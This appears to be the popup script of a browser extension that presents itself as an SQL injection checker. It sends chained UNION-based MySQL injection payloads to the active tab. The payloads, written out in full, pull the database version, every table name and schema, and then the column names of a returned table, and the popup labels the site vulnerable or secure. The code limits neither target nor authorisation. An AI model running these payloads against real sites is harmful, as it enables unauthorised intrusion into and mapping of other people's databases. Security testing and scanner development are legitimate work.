document.addEventListener('DOMContentLoaded', function () {

  function query_return(item, msg) {
    if (msg == "vulnerable") {
      $("#" + item).removeClass("fa-spinner fa-pulse");
      $("#" + item).addClass("fa-skull-crossbones");
      $("#" + item).parent().css("color", "red");
    } else {
      $("#" + item).removeClass("fa-spinner fa-pulse");
      $("#" + item).addClass("fa-lock");
      $("#" + item).parent().css("color", "limegreen");
    }
  }

  function send_to_dom(value, injection) {
    chrome.tabs.query({
      active: true,
      currentWindow: true
    }, function (activeTabs) {
      chrome.tabs.sendMessage(activeTabs[0].id, {
        action: value,
        data: injection
      });
    });
  }

  /*
  0: Returns MySQL version + arbitrary row 2.
  1: Returns all table names and table schemas in the database.
  2: Returns column names of a given table. Left blank as the string is constructed elsewhere.
  */
  var injections = [
    "' UNION (SELECT @@version, 2 FROM information_schema.tables); -- ",
    "' UNION (SELECT TABLE_NAME, TABLE_SCHEMA FROM information_schema.tables); -- ",
    ""
  ];

  var issues = 0;

  $("#status_1").parent().hide();
  $("#status_2").parent().hide();
  $("#status_3").parent().hide();


  /*
  This block sets a listener for any message from the active tab.
  Also updates the progress list.
  */
  chrome.runtime.onMessage.addListener(function (message, sender, sendResponse) {
    // Database inference
    if (message.data[0].substring(0, 1) == "1") {
      $("#status_2").parent().show();
      if (message.data[0] == "1_vulnerable") {
        query_return("status_1", "vulnerable");
        issues++;
      } else {
        query_return("status_1", "safe");
      }
      // Execute next attack
      send_to_dom("2_execute", injections[1]);
    }

    // Table names obtained
    else if (message.data[0].substring(0, 1) == "2") {
      $("#status_3").parent().show();
      if (message.data[0] == "2_vulnerable") {
        query_return("status_2", "vulnerable");
        issues++;
      } else {
        query_return("status_2", "safe");
      }
      // Execute next attack
      if (message.data.length > 1) {
        send_to_dom("3_execute", "' UNION (SELECT COLUMN_NAME, 1337 FROM information_schema.columns WHERE TABLE_NAME='" + message.data[1] + "'); -- ");
      }
    }

    // Table entries obtained
    else if (message.data[0].substring(0, 1) == "3") {
      //$("#status_4").parent().show();
      if (message.data[0] == "3_vulnerable") {
        query_return("status_3", "vulnerable");
        issues++;
        if (issues == 3) {
          $("#status_final").css("color", "red");
          $("#status_final").html("This system is very insecure.");
        } else if (issues > 0) {
          $("#status_final").css("color", "red");
          $("#status_final").html("This system contains some vulnerabilites.");
        } else {
          $("#status_final").css("color", "limegreen");
          $("#status_final").html("This system is secure.");
        }
      } else {
        query_return("status_3", "safe");
        if (issues == 3) {
          $("#status_final").css("color", "red");
          $("#status_final").html("This system is very insecure.");
        } else if (issues > 0) {
          $("#status_final").css("color", "red");
          $("#status_final").html("This system contains some vulnerabilites.");
        } else {
          $("#status_final").css("color", "limegreen");
          $("#status_final").html("This system is secure.");
        }
      }
    }

  });


  /*
  Sends the inject var as data for content.js to handle.
  */
  $("#btn_inject").on("click", function () {
    $("#status_1").parent().show();
    send_to_dom("1_execute", injections[0]);
  });



  /*
  Pagination navbar stuff.
  */
  $("#page_1").on("click", function () {
    $("#btn_inject").show();
  });

  $("#page_2").on("click", function () {});

  $("#page_3").on("click", function () {});

  $("#page_4").on("click", function () {});

  $("#page_5").on("click", function () {});

  $("#page_6").on("click", function () {});

  $("#page_7").on("click", function () {});



})